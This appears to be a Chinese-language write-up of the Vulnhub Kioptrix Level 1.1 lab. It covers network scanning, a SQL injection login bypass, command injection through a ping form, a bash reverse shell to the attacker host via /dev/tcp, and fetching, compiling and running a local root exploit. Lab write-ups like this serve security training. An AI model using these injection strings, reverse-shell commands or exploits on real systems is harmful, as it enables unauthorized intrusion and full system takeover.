# Vulnhub Kioptix Level 1.1（#2）


# Vulnhub-kioptix-Level-1.1(#2)

### 基本信息

kali:192.168.110.10

靶机:192.168.110.17

### 一、信息收集

```
└─# arp-scan --interface=eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.110.1   00:50:56:a3:2e:39       VMware, Inc.
192.168.110.17  00:0c:29:de:9d:0f       VMware, Inc.
192.168.110.18  00:50:56:a3:de:c6       VMware, Inc.
192.168.110.19  00:50:56:a3:bd:59       VMware, Inc.

82 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 3.127 seconds (81.87 hosts/sec). 4 responded
```

```
└─# nmap -sV 192.168.110.17 -p1-65535
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 16:37 CST
Nmap scan report for 192.168.110.17
Host is up (0.00023s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
645/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:DE:9D:0F (VMware)
```

### 二、漏洞利用

网页登录框试下万能码`' or 1='1`

登录进去

`127.0.0.1;whoami`

```
127.0.0.1;whoami
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.016 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.028 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.016/0.023/0.028/0.007 ms, pipe 2
apache
```

`127.0.0.1;bash -i >& /dev/tcp/192.168.110.10/4444 0>&1`

`nc -nvlp 4444`

```
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

```
searchsploit privilege | grep centos -i
```



```
python3 -m http.server 6666
```

```
wget http://192.168.110.10:6666/9542.c
```

```
gcc -o 9542 9542.c
```

```
./9542
```

```
sh-3.00# whoami
root
```


